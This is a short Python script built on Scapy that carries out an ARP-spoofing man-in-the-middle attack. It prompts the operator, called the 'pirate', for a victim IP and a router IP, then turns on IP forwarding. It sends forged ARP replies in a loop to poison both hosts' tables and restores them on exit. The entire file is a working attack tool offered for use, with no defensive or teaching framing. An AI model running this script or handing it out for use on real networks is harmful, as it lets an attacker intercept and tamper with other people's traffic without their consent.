#! usr/bin/python3

#Imports
try:
    from scapy.all import *
    import sys
    import os
    import time
    import random
except ImportError:
    print("Error while importing Scapy")
    sys.exit(1)




#Ask the pirate for the network and victim's informations
try:
    interface = input("[*] Enter Desired Interface: ")
    victimIP = input("[*] Enter Victim IP: ")
    routerIP = input("[*] Enter Router IP: ")

except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("\n[*] Exiting...")
    sys.exit(1)


#Activate IP Forwarding
print("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


#Retrieve MAC Addresses
def get_mac(IP) :
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


#Redefine ARP Tables
def reARP() :
    print("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    routerMAC = get_mac(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 7) 
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)


#Spoofing ARP Tables
def poison(router, victim):
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = victim))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = router))


#Main Script
def mitm() :
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Couldn't Find Victim MAC Address")
        print("[*] Exiting...")
        sys.exit(1)

    try:
        routerMAC = get_mac(routerIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Couldn't Find Router MAC Address")
        print("[*] Exiting...")
        sys.exit(1)
    
    print("[*] Poisoning Targets...")
    while 1 : 
        try:
            poison(routerMAC, victimMAC)
            time.sleep(2)
        except KeyboardInterrupt:
            reARP()
            break

#Launch Script
mitm()